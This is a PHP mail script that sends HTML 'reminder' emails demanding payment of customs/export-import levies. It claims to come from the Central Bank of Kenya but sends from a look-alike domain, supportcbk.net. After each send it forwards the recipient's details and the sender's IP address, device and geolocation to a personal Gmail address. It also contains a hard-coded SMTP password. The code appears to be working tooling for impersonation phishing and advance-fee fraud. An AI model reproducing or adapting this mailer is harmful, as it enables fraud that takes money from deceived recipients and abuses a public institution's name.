<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'email_errors.log');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'vendor/autoload.php';
require_once 'ReminderEmailTemplate.php';

// Set headers for JSON response
header('Content-Type: application/json');

// Initialize response array
$response = [
    'success' => false,
    'message' => ''
];

try {
    // Check if request is POST
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method');
    }

    // Get and sanitize form data
    $recipient_name = isset($_POST['recipient_name']) ? htmlspecialchars(trim($_POST['recipient_name']), ENT_QUOTES, 'UTF-8') : '';
    $email = isset($_POST['email']) ? filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL) : '';
    
    // Validate required fields
    if (empty($recipient_name) || empty($email)) {
        throw new Exception('Recipient name and email are required');
    }

    // Set default values from form
    $payment_amount = isset($_POST['payment_amount']) ? (float)$_POST['payment_amount'] : 0;
    $payment_date = isset($_POST['payment_date']) ? $_POST['payment_date'] : date('l, j F Y');
    $payment_time = isset($_POST['payment_time']) ? $_POST['payment_time'] : date('h:i A');
    $revised_levy = isset($_POST['revised_levy']) ? (float)$_POST['revised_levy'] : 0;
    $outstanding_balance = isset($_POST['outstanding_balance']) ? (float)$_POST['outstanding_balance'] : 0;
    $due_date = isset($_POST['due_date']) ? $_POST['due_date'] : date('l, j F Y', strtotime('+2 days'));
    $remittance_amount = isset($_POST['remittance_amount']) ? (float)$_POST['remittance_amount'] : 0;
    $levy_type = isset($_POST['levy_type']) ? $_POST['levy_type'] : 'Customs/Export-Import Levy';
    $levy_percentage = isset($_POST['levy_percentage']) ? (int)$_POST['levy_percentage'] : 5;

    // Create and configure email template
    $emailTemplate = new ReminderEmailTemplate();
    $emailTemplate
        ->setRecipientName($recipient_name)
        ->setPaymentAmount($payment_amount)
        ->setPaymentDate($payment_date)
        ->setPaymentTime($payment_time)
        ->setLevyType($levy_type)
        ->setLevyPercentage($levy_percentage)
        ->setReferenceNumber("REF-" . time())
        ->setSenderName("Central Bank of Kenya")
        ->setSenderTitle("Banking and Payment Services")
        ->setRevisedLevyAmount($revised_levy)
        ->setOutstandingBalance($outstanding_balance)
        ->setDueDate($due_date)
        ->setRemittanceAmount($remittance_amount);

    // Generate email content
    $emailData = $emailTemplate->generateEmail();

    // Configure PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'mail.supportcbk.net';
        $mail->SMTPAuth = true;
        $mail->Username = 'info@supportcbk.net';
        $mail->Password = 'Mont@2001';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;
        $mail->SMTPDebug = 0;
        $mail->SMTPOptions = [
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            ]
        ];

        // Recipients
        $mail->setFrom('info@supportcbk.net', 'Central Bank of Kenya');
        $mail->addAddress($email, $recipient_name);
        $mail->addReplyTo('info@supportcbk.net', 'Central Bank of Kenya');

        // Content
        $mail->isHTML(true);
        $mail->Subject = $emailData['subject'];
        $mail->Body = $emailData['body'];
        $mail->AltBody = strip_tags($emailData['body']);

        // Send email
        $mail->send();
        
        $response = [
            'success' => true,
            'message' => 'Reminder email has been sent successfully.'
        ];

        // Send admin notification with device info
        $deviceInfo = getDeviceInfo();
        $emailDetails = [
            'payment_amount' => $payment_amount,
            'payment_date' => $payment_date,
            'payment_time' => $payment_time,
            'recipient_name' => $recipient_name,
            'recipient_email' => $email,
            'reference_number' => $emailTemplate->getReferenceNumber()
        ];
        
        sendAdminNotification($recipient_name, $email, $emailDetails, $deviceInfo);

    } catch (Exception $e) {
        throw new Exception("Message could not be sent. Mailer Error: {$mail->ErrorInfo}");
    }

} catch (Exception $e) {
    http_response_code(400);
    $response['message'] = $e->getMessage();
}

// Return JSON response
echo json_encode($response);

// Log function for debugging
function log_debug($message, $data = null) {
    $log = '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;
    if ($data !== null) {
        $log .= 'Data: ' . print_r($data, true) . PHP_EOL;
    }
    error_log($log, 3, 'email_debug.log');
}

// Helper functions for device and location info
function get_browser_name($user_agent) {
    if (strpos($user_agent, 'MSIE') !== FALSE) return 'Internet Explorer';
    elseif (strpos($user_agent, 'Edge') !== FALSE) return 'Microsoft Edge';
    elseif (strpos($user_agent, 'Trident') !== FALSE) return 'Internet Explorer';
    elseif (strpos($user_agent, 'Firefox') !== FALSE) return 'Mozilla Firefox';
    elseif (strpos($user_agent, 'Chrome') !== FALSE) return 'Google Chrome';
    elseif (strpos($user_agent, 'Safari') !== FALSE) return 'Safari';
    elseif (strpos($user_agent, 'Opera') !== FALSE) return 'Opera';
    return 'Unknown';
}

function get_os_info($user_agent) {
    if (preg_match('/windows|win32/i', $user_agent)) return 'Windows';
    elseif (preg_match('/android/i', $user_agent)) return 'Android';
    elseif (preg_match('/iphone|ipad|ipod/i', $user_agent)) return 'iOS';
    elseif (preg_match('/macintosh|mac os x/i', $user_agent)) return 'Mac OS';
    elseif (preg_match('/linux/i', $user_agent)) return 'Linux';
    return 'Unknown';
}

function get_device_type($user_agent) {
    $mobile_agents = '/(android|webos|iphone|ipad|ipod|blackberry|windows phone)/i';
    if (preg_match($mobile_agents, $user_agent)) {
        if (preg_match('/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i', $user_agent)) {
            return 'Tablet';
        }
        return 'Mobile';
    }
    return 'Desktop';
}

function get_ip_location($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return ['country' => 'Localhost', 'city' => 'Development Environment'];
    }
    
    // Try to get location from IP-API
    $location = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    
    if ($location && $location['status'] === 'success') {
        return [
            'country' => $location['country'] ?? 'Unknown',
            'country_code' => $location['countryCode'] ?? 'Unknown',
            'region' => $location['regionName'] ?? 'Unknown',
            'city' => $location['city'] ?? 'Unknown',
            'zip' => $location['zip'] ?? 'Unknown',
            'lat' => $location['lat'] ?? 'Unknown',
            'lon' => $location['lon'] ?? 'Unknown',
            'isp' => $location['isp'] ?? 'Unknown',
            'org' => $location['org'] ?? 'Unknown',
            'as' => $location['as'] ?? 'Unknown'
        ];
    }
    
    return ['country' => 'Unknown', 'city' => 'Unknown'];
}

function getDeviceInfo() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    return [
        'ip_address' => $ip,
        'user_agent' => $user_agent,
        'browser' => get_browser_name($user_agent),
        'os' => get_os_info($user_agent),
        'device_type' => get_device_type($user_agent),
        'request_time' => date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME'] ?? time()),
        'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'Unknown',
        'http_referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct access',
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'http_accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown',
        'location' => get_ip_location($ip)
    ];
}

function sendAdminNotification($recipientName, $recipientEmail, $emailDetails, $deviceInfo) {
    try {
        $adminEmail = 'livingstoneapeli@gmail.com';
        
        $subject = "New Reminder Email Sent to {$recipientName}";
        
        $body = "A new reminder email has been sent with the following details:\n\n";
        $body .= "RECIPIENT INFORMATION\n";
        $body .= "-----------------\n";
        $body .= "Name: {$recipientName}\n";
        $body .= "Email: {$recipientEmail}\n\n";
        
        $body .= "PAYMENT DETAILS\n";
        $body .= "-----------------\n";
        $body .= "Payment Amount: KES " . number_format($emailDetails['payment_amount'] ?? 0, 2) . "\n";
        $body .= "Payment Date: " . ($emailDetails['payment_date'] ?? 'N/A') . " at " . ($emailDetails['payment_time'] ?? 'N/A') . "\n";
        $body .= "Revised Levy: KES " . number_format($emailDetails['revised_levy'] ?? 0, 2) . "\n";
        $body .= "Outstanding Balance: KES " . number_format($emailDetails['outstanding_balance'] ?? 0, 2) . "\n";
        $body .= "Due Date: " . ($emailDetails['due_date'] ?? 'N/A') . "\n";
        $body .= "Remittance Amount: KES " . number_format($emailDetails['remittance_amount'] ?? 0, 2) . "\n\n";
        
        $body .= "DEVICE INFORMATION\n";
        $body .= "-------------------\n";
        $body .= "IP Address: " . ($deviceInfo['ip_address'] ?? 'N/A') . "\n";
        $body .= "User Agent: " . ($deviceInfo['user_agent'] ?? 'N/A') . "\n";
        $body .= "Location: " . ($deviceInfo['location']['country'] ?? 'N/A') . "\n";
        $body .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        
        // Log the notification
        log_debug('Sending admin notification', [
            'recipient' => $recipientEmail,
            'admin_email' => $adminEmail
        ]);
        
        // Send the email
        $mail = new PHPMailer(true);
        
        // Server settings
        $mail->isSMTP();
        $mail->Host = 'mail.supportcbk.net';
        $mail->SMTPAuth = true;
        $mail->Username = 'info@supportcbk.net';
        $mail->Password = 'Mont@2001';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;
        $mail->SMTPDebug = 0;
        $mail->SMTPOptions = [
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            ]
        ];
        
        // Recipients
        $mail->setFrom('info@supportcbk.net', 'Central Bank of Kenya');
        $mail->addAddress($adminEmail);
        
        // Content
        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body = $body;
        
        $mail->send();
        
        log_debug('Admin notification sent successfully');
        
    } catch (Exception $e) {
        log_debug('Failed to send admin notification', ['error' => $e->getMessage()]);
    }
}